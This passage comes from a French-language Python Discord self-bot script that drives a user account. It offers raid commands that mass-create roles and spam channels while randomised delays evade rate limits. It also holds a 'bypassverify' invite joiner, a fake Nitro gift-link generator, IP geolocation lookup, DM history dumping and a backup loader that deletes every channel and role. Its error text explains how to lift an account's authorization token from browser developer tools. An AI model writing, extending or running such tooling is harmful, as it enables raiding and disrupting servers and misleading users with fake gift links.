    for category in source_guild.categories:
        new_cat = await ctx.guild.create_category(category.name)
        for channel in category.channels:
            if isinstance(channel, discord.TextChannel):
                await new_cat.create_text_channel(channel.name, topic=channel.topic)
            elif isinstance(channel, discord.VoiceChannel):
                await new_cat.create_voice_channel(channel.name, user_limit=channel.user_limit)
            await asyncio.sleep(random_delay(0.6, 1.5))
    await safe_send(ctx.channel, "Structure copiée.", delete_after=5)

@bot.command()
async def dmhistory(ctx: commands.Context, user_id: int, limit: int = 50):
    """Affiche historique DM avec un user."""
    await safe_delete(ctx.message)
    user = await bot.fetch_user(user_id)
    if not user:
        await safe_send(ctx.channel, "User introuvable.", delete_after=5)
        return
    channel = await user.create_dm()
    history = []
    async for msg in channel.history(limit=limit):
        history.append(f"[{msg.created_at}] {msg.author}: {msg.content}")
    await safe_send(ctx.channel, "\n".join(history), delete_after=30)

@bot.command()
async def tokencheck(ctx: commands.Context):
    """Vérifie si le token est valide."""
    await safe_delete(ctx.message)
    try:
        await bot.fetch_user(bot.user.id)
        await safe_send(ctx.channel, "Token valide.", delete_after=5)
    except:
        await safe_send(ctx.channel, "Token invalide.", delete_after=5)

@bot.command()
async def bypassverify(ctx: commands.Context, invite: str):
    """Tente de rejoindre en bypassant vérif (non garanti)."""
    await safe_delete(ctx.message)
    try:
        await bot.http.accept_invite(invite)
        await safe_send(ctx.channel, "Rejoint.", delete_after=5)
    except Exception as e:
        await safe_send(ctx.channel, f"Erreur: {e}", delete_after=10)

# ──────────────────────────────────────────────────────────────────────────────
#                  COMMANDES SUPPLÉMENTAIRES (ajoutées)
# ──────────────────────────────────────────────────────────────────────────────

@bot.command()
async def massrole(ctx, action: str, count: int = 20, *, base_name: str = "raid-role"):
    """
    Crée ou supprime un grand nombre de rôles rapidement.
    Usage:
    .massrole create 30 Raid-       → crée 30 rôles "Raid-1", "Raid-2", etc.
    .massrole delete 30             → supprime jusqu'à 30 rôles contenant "raid-role" (ou nom de base)
    """
    await safe_delete(ctx.message)

    guild = ctx.guild
    action = action.lower()

    if action not in ("create", "delete", "supprimer", "creer"):
        await safe_send(ctx, "Action invalide. Utilise `create` ou `delete`", delete_after=8)
        return

    if count > 100:
        count = 100
        await safe_send(ctx, "Limite fixée à 100 pour éviter les soucis.", delete_after=6)

    if action in ("create", "creer"):
        created = 0
        for i in range(1, count + 1):
            try:
                name = f"{base_name}-{i}" if base_name else f"role-{random_string(5)}"
                await guild.create_role(name=name, reason="Mass role create")
                created += 1
                await asyncio.sleep(random_delay(0.4, 1.2))
            except discord.Forbidden:
                await safe_send(ctx, "Permissions insuffisantes pour créer des rôles.", delete_after=6)
                break
            except discord.HTTPException as e:
                if e.code == 50035:  # Too many roles
                    await safe_send(ctx, "Limite de rôles atteinte.", delete_after=6)
                    break
                await asyncio.sleep(1)

        await safe_send(ctx, f"**{created}** rôles créés.", delete_after=10)

    elif action in ("delete", "supprimer"):
        deleted = 0
        roles = [r for r in guild.roles if base_name.lower() in r.name.lower() and r != guild.default_role]
        roles = sorted(roles, key=lambda r: r.position, reverse=True)[:count]

        for role in roles:
            try:
                await role.delete(reason="Mass role delete")
                deleted += 1
                await asyncio.sleep(random_delay(0.5, 1.5))
            except discord.Forbidden:
                continue
            except Exception:
                continue

        await safe_send(ctx, f"**{deleted}** rôles supprimés (sur ~{len(roles)} trouvés).", delete_after=10)


@bot.command(aliases=["channelsspam", "spamchan", "masschan"])
async def channelspam(ctx, count: int = 50, *, name_base: str = "spam-"):
    """
    Crée un grand nombre de salons textuels rapidement.
    .channelspam 60 raid-
    """
    await safe_delete(ctx.message)
    guild = ctx.guild

    if count > 80:
        count = 80
        await safe_send(ctx, "Limite fixée à 80.", delete_after=5)

    created = 0
    for i in range(1, count + 1):
        try:
            chan_name = f"{name_base}{i}" if name_base else f"spam-{random_string(4)}"
            await guild.create_text_channel(chan_name, reason="Channel spam")
            created += 1
            await asyncio.sleep(random_delay(0.45, 1.3))
        except discord.Forbidden:
            await safe_send(ctx, "Pas la permission de créer des salons.", delete_after=6)
            break
        except discord.HTTPException as e:
            if "Maximum number" in str(e):
                await safe_send(ctx, "Limite de salons atteinte.", delete_after=6)
                break
            await asyncio.sleep(1)

    await safe_send(ctx, f"**{created}** salons textuels créés.", delete_after=10)


@bot.command(aliases=["quittetout", "byeall"])
async def leaveall(ctx, confirm: str = None):
    """
    Quitte TOUS les serveurs sauf ceux où vous êtes whitelisté (ou votre propre compte).
    .leaveall confirm
    """
    await safe_delete(ctx.message)

    if confirm != "confirm":
        await safe_send(ctx, "**DANGER** – Cette commande quitte TOUS les serveurs sauf whitelist.\n"
                             "Pour confirmer : `.leaveall confirm`", delete_after=20)
        return

    left = 0
    for guild in list(bot.guilds):
        if guild.owner_id == bot.user.id:
            continue  # on ne quitte pas ses propres serveurs
        if any(m.id in WHITELIST for m in guild.members if m.id == bot.user.id):
            continue  # serveur où un membre de la whitelist est présent

        try:
            await guild.leave()
            left += 1
            await asyncio.sleep(random_delay(2.0, 5.5))  # très prudent ici
            logger.info(f"Quitté le serveur : {guild.name} ({guild.id})")
        except discord.Forbidden:
            logger.warning(f"Impossible de quitter {guild.name} (permissions bizarres)")
        except Exception as e:
            logger.error(f"Erreur leave {guild.name}: {e}")

    await safe_send(ctx, f"**{left}** serveurs quittés.\nRestent : {len(bot.guilds)}", delete_after=15)


@bot.command(aliases=["type", "fakewrite", "typing"])
async def faketyping(ctx, seconds: float = 8.0):
    """
    Simule que tu es en train d'écrire pendant X secondes dans le salon actuel.
    .faketyping 12
    """
    await safe_delete(ctx.message)

    if seconds > 25:
        seconds = 25.0

    try:
        async with ctx.channel.typing():
            await asyncio.sleep(seconds)
        # Aucune notification envoyée
    except discord.Forbidden:
        # Silencieux si pas de perm
        pass

# ──────────────────────────────────────────────────────────────────────────────
#                               LANCEMENT
# ──────────────────────────────────────────────────────────────────────────────

def ask_token():
    """Demande le token à l'utilisateur ou via env var."""
    token = os.environ.get("DISCORD_TOKEN")
    if token:
        return token.strip().strip('"').strip("'")

    print("\n" + "=" * 60)
    print("         SELF-BOT DISCORD AVANCÉ - VERSION 2026")
    print("=" * 60)
    token = input("\nEntrez votre token Discord: ").strip().strip('"').strip("'")
    if len(token) < 50:
        print("Token invalide. Arrêt.")
        sys.exit(1)
    return token

def run_bot(token: str):
    """Lance le bot."""
    try:
        # Debug token (securely)
        masked_token = token[:5] + "..." + token[-5:] if len(token) > 10 else "******"
        logger.info(f"Tentative de connexion avec le token (longueur: {len(token)}): {masked_token}")
        
        # Check if we are already running in an event loop (unlikely for main process, but possible in some envs)
        # For discord.py-self, run() is blocking.
        bot.run(token)
    except discord.LoginFailure as e:
        error_msg = (
            "\n\n❌ ======================================================= ❌\n"
            "   TOKEN INVALIDE OU EXPIRÉ\n"
            "   Le token fourni ne fonctionne plus. Discord l'a peut-être réinitialisé.\n"
            "   \n"
            "   👉 COMMENT AVOIR UN NOUVEAU TOKEN :\n"
            "   1. Ouvrez Discord dans votre navigateur (Chrome/Firefox)\n"
            "   2. Faites Ctrl + Shift + I (Outils de développement)\n"
            "   3. Allez dans l'onglet 'Network' (Réseau)\n"
            "   4. Écrivez quelque chose dans un salon\n"
            "   5. Cherchez 'messages' dans la liste\n"
            "   6. Cliquez dessus, puis cherchez 'authorization' dans les headers\n"
            "   7. Copiez ce code et mettez-le dans le bot\n"
            "❌ ======================================================= ❌\n"
        )
        logger.error(error_msg)
        print(error_msg) # Ensure it prints to console too
    except Exception as e:
        logger.error(f"Erreur démarrage: {e}")
        import traceback
        logger.error(traceback.format_exc())

@bot.command()
async def nitro(ctx: commands.Context, amount: int = 1):
    """Génère de faux liens Nitro."""
    await safe_delete(ctx.message)
    if amount > 10:
        amount = 10
    
    links = []
    for _ in range(amount):
        # 16-24 chars alphanumeric
        code = random_string(16) 
        links.append(f"https://discord.gift/{code}")
    
    await safe_send(ctx.channel, "\n".join(links))

@bot.command()
async def rpc(ctx: commands.Context, type_arg: str = "play", *, text: str = "Selfbot v3"):
    """
    Définit une Rich Presence personnalisée.
    Usage: .rpc <play/watch/listen/stream> <texte>
    """
    await safe_delete(ctx.message)
    
    activity_type = discord.ActivityType.playing
    if type_arg.lower() == "watch":
        activity_type = discord.ActivityType.watching
    elif type_arg.lower() == "listen":
        activity_type = discord.ActivityType.listening
    elif type_arg.lower() == "stream":
        activity_type = discord.ActivityType.streaming
        await bot.change_presence(activity=discord.Streaming(name=text, url="https://twitch.tv/ninja"))
        await safe_send(ctx.channel, f"🟣 RPC Streaming: {text}", delete_after=5)
        return

    await bot.change_presence(activity=discord.Activity(type=activity_type, name=text))
    await safe_send(ctx.channel, f"🟢 RPC {type_arg.capitalize()}: {text}", delete_after=5)

# ──────────────────────────────────────────────────────────────────────────────
#                          Système de Cooldown Global
# ──────────────────────────────────────────────────────────────────────────────
# Stockage des cooldowns: {command_name: {user_id: timestamp}}
_cooldowns = collections.defaultdict(dict)

def check_cooldown(ctx, command_name: str, seconds: int) -> bool:
    """Vérifie si une commande est en cooldown pour l'utilisateur."""
    now = time.time()
    user_cooldowns = _cooldowns[command_name]
    
    last_usage = user_cooldowns.get(ctx.author.id, 0)
    if now - last_usage < seconds:
        return False
    
    user_cooldowns[ctx.author.id] = now
    return True

@bot.command()
async def backup(ctx: commands.Context, action: str = "create", file_arg: str = None):
    """
    Système de backup complet.
    Usage:
      .backup create          -> Crée une sauvegarde du serveur
      .backup load <fichier>  -> Charge une sauvegarde (DANGEREUX: Supprime tout avant !)
    """
    await safe_delete(ctx.message)

    if not ctx.guild:
        await safe_send(ctx.channel, "❌ Commande utilisable uniquement sur un serveur.", delete_after=5)
        return

    # Cooldown de 60 secondes pour éviter le spam de backups
    if not check_cooldown(ctx, "backup", 60):
        await safe_send(ctx.channel, "⏳ Veuillez attendre 1 minute entre chaque backup.", delete_after=5)
        return

    if action.lower() == "create":
        await safe_send(ctx.channel, "⏳ Sauvegarde de la structure en cours...", delete_after=5)
        
        data = {
            "name": ctx.guild.name,
            "id": ctx.guild.id,
            "created_at": str(ctx.guild.created_at),
            "channels": [],
            "roles": []
        }

        # Sauvegarde des rôles (inverse order pour hiérarchie)
        for role in reversed(ctx.guild.roles):
            if not role.is_default() and not role.managed: # On ignore @everyone et les rôles de bots
                data["roles"].append({
                    "name": role.name,
                    "permissions": role.permissions.value,
                    "color": role.color.value,
                    "hoist": role.hoist,
                    "mentionable": role.mentionable
                })

        # Sauvegarde des salons
        # On trie par position pour garder l'ordre
        sorted_channels = sorted(ctx.guild.channels, key=lambda c: c.position)
        for channel in sorted_channels:
            c_data = {
                "name": channel.name,
                "type": str(channel.type),
                "position": channel.position,
                "category": channel.category.name if channel.category else None
            }
            if isinstance(channel, discord.TextChannel):
                c_data["topic"] = channel.topic
                c_data["nsfw"] = channel.nsfw
            elif isinstance(channel, discord.VoiceChannel):
                c_data["user_limit"] = channel.user_limit
                c_data["bitrate"] = channel.bitrate
            
            data["channels"].append(c_data)

        filename = f"backup_{ctx.guild.id}_{int(time.time())}.json"
        import json
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
        
        await safe_send(ctx.channel, f"✅ Sauvegarde terminée: `{filename}`", delete_after=10)

    elif action.lower() == "load":
        # Vérification des permissions critiques
        if not ctx.author.guild_permissions.administrator:
            await safe_send(ctx.channel, "❌ Vous devez être Administrateur pour charger une backup.", delete_after=5)
            return

        if not file_arg:
            await safe_send(ctx.channel, "❌ Usage: `.backup load <nom_du_fichier.json>`", delete_after=5)
            return
        
        if not os.path.exists(file_arg):
             await safe_send(ctx.channel, "❌ Fichier de backup introuvable.", delete_after=5)
             return

        await safe_send(ctx.channel, "⚠️ **ATTENTION** : Chargement de backup en cours...\nCeci va supprimer tous les salons et rôles existants dans 10 secondes !", delete_after=10)
        await asyncio.sleep(10)

        import json
        try:
            with open(file_arg, "r", encoding="utf-8") as f:
                backup_data = json.load(f)
        except Exception as e:
            await safe_send(ctx.channel, f"❌ Erreur lecture fichier: {e}", delete_after=5)
            return

        # 1. Suppression de tout (DANGER)
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                await asyncio.sleep(0.5)
            except: pass
        
        for role in ctx.guild.roles:
            try:
                if not role.is_default() and not role.managed:
                    await role.delete()
                    await asyncio.sleep(0.5)
            except: pass

        # 2. Restauration des rôles
        role_map = {} # Ancien nom -> Nouvel objet Role
        for r_data in backup_data["roles"]:
            try:
                new_role = await ctx.guild.create_role(
                    name=r_data["name"],
                    permissions=discord.Permissions(r_data["permissions"]),
                    color=discord.Color(r_data["color"]),
                    hoist=r_data["hoist"],
                    mentionable=r_data["mentionable"]
                )
                role_map[r_data["name"]] = new_role
                await asyncio.sleep(1)
            except Exception as e:
                print(f"[Backup] Erreur création rôle {r_data['name']}: {e}")

        # 3. Restauration des catégories et salons
        # On recrée d'abord les catégories pour y mettre les salons
        categories = {}
        
        # On sépare catégories et autres salons
        channels_data = backup_data["channels"]
        
        # D'abord créer les catégories
        for c_data in channels_data:
            if "category" in c_data["type"] or c_data["type"] == "text" and c_data.get("category") is None: 
               # Simplification: Discord py types sont un peu complexes en string, on fait au mieux
               pass

        # Approche simplifiée: On crée tout à la racine pour éviter la complexité des catégories dans un selfbot simple
        # Ou on tente de recréer les catégories à la volée
        
        for c_data in channels_data:
            try:
                # Gestion basique des types
                if "text" in c_data["type"]:
                    await ctx.guild.create_text_channel(name=c_data["name"], topic=c_data.get("topic"))
                elif "voice" in c_data["type"]:
                    await ctx.guild.create_voice_channel(name=c_data["name"])
                elif "category" in c_data["type"]:
                    await ctx.guild.create_category(name=c_data["name"])
                
                await asyncio.sleep(1)
            except Exception as e:
                print(f"[Backup] Erreur création salon {c_data['name']}: {e}")

        # On essaie d'envoyer un message dans le premier salon textuel trouvé
        for channel in ctx.guild.text_channels:
            try:
                await channel.send("✅ Backup chargée avec succès !")
                break
            except: pass

    else:
        await safe_send(ctx.channel, "Usage: .backup <create/load>", delete_after=5)

@bot.command()
async def purgedms(ctx: commands.Context, user_arg: str, limit: int = 100):
    """
    Supprime tes messages privés avec un utilisateur spécifique.
    Usage: .purgedms <id/mention> [limit]
    """
    await safe_delete(ctx.message)
    
    # Résolution de l'utilisateur cible
    user_id = None
    try:
        user_id = int(re.sub(r"\D", "", user_arg))
    except:
        await safe_send(ctx.channel, "❌ ID invalide.", delete_after=5)
        return

    target = bot.get_user(user_id)
    if not target:
        try:
            target = await bot.fetch_user(user_id)
        except:
            await safe_send(ctx.channel, "❌ Utilisateur introuvable.", delete_after=5)
            return

    # Ouverture du DM
    dm_channel = target.dm_channel
    if not dm_channel:
        dm_channel = await target.create_dm()

    await safe_send(ctx.channel, f"🗑️ Suppression des {limit} derniers messages avec {target}...", delete_after=5)
    
    deleted_count = 0
    async for msg in dm_channel.history(limit=limit):
        if msg.author == bot.user:
            try:
                await msg.delete()
                deleted_count += 1
                await asyncio.sleep(0.5) # Anti-ratelimit soft
            except:
                pass
    
    await safe_send(ctx.channel, f"✅ {deleted_count} messages supprimés avec {target}.", delete_after=5)

@bot.command()
async def ipinfo(ctx: commands.Context, ip: str):
    """
    Affiche les informations de géolocalisation d'une IP.
    Usage: .ipinfo <ip>
    """
    await safe_delete(ctx.message)
    
    url = f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query"
    
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            if response.status == 200:
                data = await response.json()
                if data['status'] == 'success':
                    info = [
                        f"🌍 **IP Info**: `{data['query']}`",
                        f"📍 **Pays**: {data['country']} ({data['countryCode']})",
                        f"🏙️ **Ville**: {data['city']}, {data['regionName']}",
                        f"📮 **Code Postal**: {data['zip']}",
                        f"🕒 **Timezone**: {data['timezone']}",
                        f"🏢 **ISP**: {data['isp']}",
                        f"🏢 **Org**: {data['org']}",
                        f"📡 **AS**: {data['as']}",
                        f"🗺️ **Maps**: https://www.google.com/maps/search/?api=1&query={data['lat']},{data['lon']}"
                    ]
                    await safe_send(ctx.channel, "\n".join(info))
                else:
                    await safe_send(ctx.channel, f"❌ Erreur API: {data.get('message', 'Inconnue')}", delete_after=5)
            else:
                await safe_send(ctx.channel, "❌ Impossible de contacter l'API.", delete_after=5)

@bot.command()
async def qrcode(ctx: commands.Context, *, text: str):
    """
    Génère un QR Code à partir d'un texte ou d'un lien.
    Usage: .qrcode <texte/lien>
    """
    await safe_delete(ctx.message)
    
    # Utilisation de l'API goqr.me (gratuite et fiable)
    api_url = f"https://api.qrserver.com/v1/create-qr-code/?size=250x250&data={text}"
    
    await safe_send(ctx.channel, f"📱 **QR Code pour** `{text}`:\n{api_url}")

@bot.command()
async def restart(ctx: commands.Context):
    """Redémarre le bot (utile après update)."""
    await safe_delete(ctx.message)
    await safe_send(ctx.channel, "🔄 Redémarrage en cours...", delete_after=5)
    os.execv(sys.executable, [sys.executable] + sys.argv)

# ──────────────────────────────────────────────────────────────────────────────
#                          Système d'Animation de Statut
# ──────────────────────────────────────────────────────────────────────────────
_anim_task = None

@bot.command()
async def anim(ctx: commands.Context, *, text: str):
    """
    Anime votre statut avec un texte défilant.
    Usage: .anim <texte>
    """
    global _anim_task
    await safe_delete(ctx.message)
    
    if _anim_task:
        _anim_task.cancel()

    async def animate_status():
        try:
            # Ajout d'espaces pour l'effet de défilement
            padded_text = text + "     " 
            while True:
                for i in range(len(padded_text)):
                    # Effet de défilement (scrolling marquee)
                    current_status = padded_text[i:] + padded_text[:i]
                    # On change le statut (Game activity)
                    await bot.change_presence(activity=discord.Game(name=current_status))
                    await asyncio.sleep(2.5) # Délai pour éviter le ratelimit
        except asyncio.CancelledError:
            pass
        except Exception as e:
            print(f"[Anim] Erreur: {e}")

    _anim_task = bot.loop.create_task(animate_status())
    await safe_send(ctx.channel, f"💫 Animation démarrée: `{text}`", delete_after=5)

@bot.command()
async def stopanim(ctx: commands.Context):
    """Arrête l'animation de statut."""
    global _anim_task
    await safe_delete(ctx.message)
    
    if _anim_task:
        _anim_task.cancel()
        _anim_task = None
        # Remet le statut par défaut (ou vide)
        await bot.change_presence(activity=None, status=discord.Status.online)
        await safe_send(ctx.channel, "🛑 Animation arrêtée.", delete_after=5)
    else:
        await safe_send(ctx.channel, "❌ Aucune animation en cours.", delete_after=5)

@bot.command()
async def update(ctx: commands.Context, force_git: str = "no"):
    """
    Redémarre le bot (pour appliquer les modifications).
    Usage: .update [yes/no] (yes pour forcer git pull, défaut: no)
    """
    await safe_delete(ctx.message)
    await safe_send(ctx.channel, "🔄 Redémarrage du bot en cours...", delete_after=5)
    
    if force_git.lower() in ["yes", "y", "true", "on"]:
        try:
            await safe_send(ctx.channel, "⬇️ Tentative de Git Pull...", delete_after=5)
            process = subprocess.Popen(["git", "pull"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()
            if process.returncode == 0:
                await safe_send(ctx.channel, f"✅ Git Pull réussi:\n```{stdout.decode()[:1000]}```", delete_after=10)
            else:
                await safe_send(ctx.channel, f"⚠️ Erreur Git (mais redémarrage quand même):\n```{stderr.decode()[:1000]}```", delete_after=10)
        except Exception as e:
            await safe_send(ctx.channel, f"⚠️ Erreur Git: {e}", delete_after=10)

    # Redémarrage du processus
    # On ferme proprement les sessions si possible
    try:
        await bot.close()
    except:
        pass
        
    os.execv(sys.executable, [sys.executable] + sys.argv)

if __name__ == "__main__":
    TOKEN = ask_token()
    run_bot(TOKEN)